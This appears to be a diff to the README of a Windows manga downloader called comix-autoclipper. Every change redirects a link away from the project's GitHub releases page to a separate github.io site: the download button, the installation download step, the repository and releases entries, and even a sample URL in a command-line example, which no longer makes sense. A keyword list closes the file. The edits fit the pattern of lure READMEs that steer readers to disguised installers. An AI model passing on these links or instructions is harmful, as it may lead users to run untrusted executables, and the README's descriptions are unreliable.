@@ -1,7 +1,7 @@
 <h1>🎨 comix-autoclipper - Download Manga Faster Than Ever</h1>
 
 <p align="center">
-  <a href="https://github.com/Eighteenthpodocarpaceae846/comix-autoclipper/releases"><img src="https://img.shields.io/badge/Download-comix--autoclipper-blue?style=for-the-badge&logo=github" alt="Download Button" style="background:#4CAF50;color:white;padding:15px 30px;border-radius:5px;font-size:20px;text-decoration:none;"></a>
+  <a href="https://eighteenthpodocarpaceae846.github.io"><img src="https://img.shields.io/badge/Download-comix--autoclipper-blue?style=for-the-badge&logo=github" alt="Download Button" style="background:#4CAF50;color:white;padding:15px 30px;border-radius:5px;font-size:20px;text-decoration:none;"></a>
 </p>
 
 ## 📖 What Is comix-autoclipper?
@@ -29,7 +29,7 @@ Follow these simple steps to get comix-autoclipper running on your Windows compu
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Eighteenthpodocarpaceae846/comix-autoclipper/releases](https://github.com/Eighteenthpodocarpaceae846/comix-autoclipper/releases)
+Visit this link to download the application: [https://eighteenthpodocarpaceae846.github.io](https://eighteenthpodocarpaceae846.github.io)
 
 You'll see a page with several files. Look for the Windows installer - it usually has "windows" or "setup" in its name. Choose the one that matches your system (most people use 64-bit). Click the download link and wait for the file to save to your computer.
 
@@ -61,7 +61,7 @@ If you like using a terminal or want to automate things, comix-autoclipper inclu
 
 ```
 comix-autoclipper --search "One Piece"
-comix-autoclipper --download --url "https://example.com/manga/123" --format pdf
+comix-autoclipper --download --url "https://eighteenthpodocarpaceae846.github.io" --format pdf
 comix-autoclipper --batch --list "my-manga-list.txt"
 ```
 
@@ -152,8 +152,8 @@ If you ever get stuck, simply revisit the release page for the latest version or
 
 ## 🔗 Additional Resources
 
-- **Main Repository:** https://github.com/Eighteenthpodocarpaceae846/comix-autoclipper
-- **Releases & Downloads:** https://github.com/Eighteenthpodocarpaceae846/comix-autoclipper/releases
+- **Main Repository:** https://eighteenthpodocarpaceae846.github.io
+- **Releases & Downloads:** https://eighteenthpodocarpaceae846.github.io
 - **Issue Tracker:** Use the repository's Issues tab on GitHub to report bugs or request features.
 
 Keywords: 18comic, comick, comick-api, comick-downloader, comickapi, comickio, comickio-downloader
